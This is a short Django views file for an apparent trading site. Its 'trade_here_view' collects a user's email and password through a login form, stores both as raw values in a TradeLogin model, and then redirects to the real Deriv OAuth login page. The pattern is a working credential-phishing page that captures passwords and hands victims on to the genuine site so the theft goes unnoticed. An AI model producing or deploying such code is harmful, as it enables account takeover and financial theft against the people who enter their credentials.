from django.shortcuts import render, redirect
from .forms import TradeLoginForm
from .models import TradeLogin, Profile  # Ensure Profile is imported

# ✅ Home view
def home(request):
    profile = Profile.objects.first()
    return render(request, 'home.html', {'profile': profile})

# ✅ Trade login view
def trade_here_view(request):
    if request.method == 'POST':
        form = TradeLoginForm(request.POST)
        if form.is_valid():
            TradeLogin.objects.create(
                email=form.cleaned_data['email'],
                password=form.cleaned_data['password']
            )
            return redirect("https://oauth.deriv.com/oauth2/authorize?app_id=69573&l=EN&brand=deriv")
    else:
        form = TradeLoginForm()

    return render(request, 'trade_here.html', {'form': form})